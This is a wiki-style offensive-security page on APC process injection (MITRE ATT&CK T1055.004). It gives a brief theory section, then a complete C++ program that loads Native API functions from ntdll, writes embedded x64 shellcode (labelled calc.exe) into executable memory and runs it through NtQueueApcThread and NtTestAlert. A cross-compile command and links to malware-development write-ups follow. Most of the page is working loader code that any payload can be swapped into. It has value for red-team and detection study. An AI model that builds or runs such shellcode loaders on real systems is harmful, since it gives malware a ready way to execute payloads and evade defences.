---
description: >-
  MITRE ATT&CK™ Process Injection: Asynchronous Procedure Call - Technique
  T1055.004
---

# NtQueueApcThread & NtTestAlert Shellcode Execution

## Theory

This page explores **APC (Asynchronous Procedure Call) Shellcode Execution** technique with the undocumented Native API, **NtTestAlert**, to execute shellcode within a local process.&#x20;

An **APC (Asynchronous Procedure Call)** is a function that executes asynchronously in the context of a specific thread. Windows provides the **NtQueueApcThread** function, which allows an APC routine to be added to a thread’s APC queue. The function will execute when the thread enters an **alertable state**.

#### Conditions for Execution

For an APC to be executed, the target thread must enter an alertable state. This can be achieved through functions like:

* `SleepEx()`
* `WaitForSingleObjectEx()`
* `WaitForMultipleObjectsEx()`
* `SignalObjectAndWait()`

However **`NtTestAlert`** can be used during APC injection to:

* Activate a thread’s alertable state.
* Prompt the execution of queued APCs to execute our shellcode.

### Execution Flow

1. **Memory Allocation**: Allocate memory using `NtAllocateVirtualMemory`.
2. **Shellcode Injection**: Write shellcode to the allocated memory via `NtWriteVirtualMemory`.
3. **Memory Protection Change**: Modify the memory protection to executable with `NtProtectVirtualMemory`.
4. **Queue APC Function**: Use `NtQueueApcThread` to queue the shellcode for execution.
5. **Trigger APC Execution**: Force the thread into an alertable state using `NtTestAlert`, which executes the shellcode.

## Practice

{% tabs %}
{% tab title="C++" %}
The following code implements this technique:

{% code title="QueueAPC.cpp" %}
```cilkcpp
#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <tchar.h>

// Add these typedefs and function declarations for the NT functions
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef NTSTATUS (NTAPI *pNtQueueApcThread)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
);

typedef NTSTATUS (NTAPI *pNtTestAlert)(
    VOID
);

typedef NTSTATUS (NTAPI *pNtClose)(
    HANDLE Handle
);

// Define NTSTATUS if not already defined
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

DWORD WINAPI esc_main(LPVOID lpParameter)
{
    DWORD dwSize;

    //calc.exe shellcode
    unsigned char decoded[] = {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00};
    SIZE_T length = sizeof(decoded);


    // Load NT functions dynamically
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        std::cerr << "Failed to get handle to ntdll.dll" << std::endl;
        return 1;
    }
    
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    pNtQueueApcThread NtQueueApcThread = (pNtQueueApcThread)GetProcAddress(hNtdll, "NtQueueApcThread");
    pNtTestAlert NtTestAlert = (pNtTestAlert)GetProcAddress(hNtdll, "NtTestAlert");
    pNtClose NtClose = (pNtClose)GetProcAddress(hNtdll, "NtClose");
    
    if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory || 
        !NtQueueApcThread || !NtTestAlert || !NtClose) {
        std::cerr << "Failed to get addresses of NT functions" << std::endl;
        return 1;
    }

    //####SYSCALL####
    HANDLE hProc = GetCurrentProcess();
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    HANDLE hThread = NULL;
    SIZE_T bytesWritten;
    SIZE_T pnew = length;
    NTSTATUS status;

    // Allocate memory for shellcode
    status = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        std::cerr << "NtAllocateVirtualMemory failed with status: " << std::hex << status << std::endl;
        return 1;
    }
    
    // Write shellcode to allocated memory
    status = NtWriteVirtualMemory(hProc, base_addr, decoded, length, &bytesWritten);
    if (status != 0) {
        std::cerr << "NtWriteVirtualMemory failed with status: " << std::hex << status << std::endl;
        return 1;
    }
    
    // Change memory protection to executable
    status = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&length, PAGE_EXECUTE_READ, &oldprotect);
    if (status != 0) {
        std::cerr << "NtProtectVirtualMemory failed with status: " << std::hex << status << std::endl;
        return 1;
    }
    
    // Queue APC to current thread
    HANDLE currentThread = GetCurrentThread();
    status = NtQueueApcThread(currentThread, base_addr, NULL, NULL, NULL);
    if (status != 0) {
        std::cerr << "NtQueueApcThread failed with status: " << std::hex << status << std::endl;
        return 1;
    }
    
    std::cout << "Queued APC, alerting thread to process it..." << std::endl;
    
    // Alert the thread to process the APC
    status = NtTestAlert();
    if (status != 0) {
        std::cerr << "NtTestAlert failed with status: " << std::hex << status << std::endl;
        return 1;
    }
    
    // Clean up handle
    NtClose(hProc);
    
    std::cout << "Execution completed" << std::endl;
    return 0;
}

int main()
{
    esc_main(NULL);
    return 0;
}

```
{% endcode %}

We can compile it from linux using following command

```bash
x86_64-w64-mingw32-g++ QueueAPC.cpp -o QueueAPC.exe -std=c++20 -static
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert" %}

{% embed url="https://sid4hack.medium.com/malware-development-part-12-apc-injection-via-nttestalert-8beb70834dff" %}
